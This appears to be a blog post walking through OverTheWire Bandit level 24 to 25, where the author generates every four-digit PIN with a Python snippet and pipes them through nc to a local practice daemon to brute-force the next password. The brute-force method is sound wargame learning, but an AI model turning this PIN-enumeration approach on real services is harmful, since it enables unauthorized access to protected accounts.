
### Level 24 -> Level 25


1. login

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
# on password prompt I gave the new password fromt he previous level

```
2. find password

I needed to create a file having all the combinations and pass them to the
listening program on port 30002.
I used `nc` to send my data to it.


```bash
>>> with open('passes', 'w') as f:
...   for i in range(10000):
...     f.write('UoMYT1rfrBFHyQXmg6gzctqAwOmw1IohZ {:04d}'.format(i))
...
>>>
```
Note: I have changed the password for level 24 in the above snippet because it
is good to find that yourself.

This was quite tough to brute force and I failed at it many times. HOwever,
creating this file using the above script, inside the `Python` console was
quite helpful. Challenge was to pass the values to the listening program on
port 30002. I was able to do it in 02 steps.

```bash
# step 1
cat passes | nc localhost 30002 > results
# step 2
cat results | uniq
```

I faced many pitfalls such as running background process using `&`, trying
multithreading to save on time. Waiting for shell script to try all attempts;
It was damn slow and bandit server was getting disconnected because of the
timeout. The above step1 also crashed around 7000 tries, I had to bring
remaining 3000 attemps in `passes` to another file to try out the command as
shown below.

```bash
# step 1
cat passes_7000 | nc localhost 30002 > results_7000
# step 2
cat results_7000 | uniq
```

After this I was quite happy to see the password on the console. Anyways, I am
feeling both happy and sad. I have reached another level in the game. I have
become quite slow in finding the solutions. Therefore, I will continue writing
about other levels in my next post.

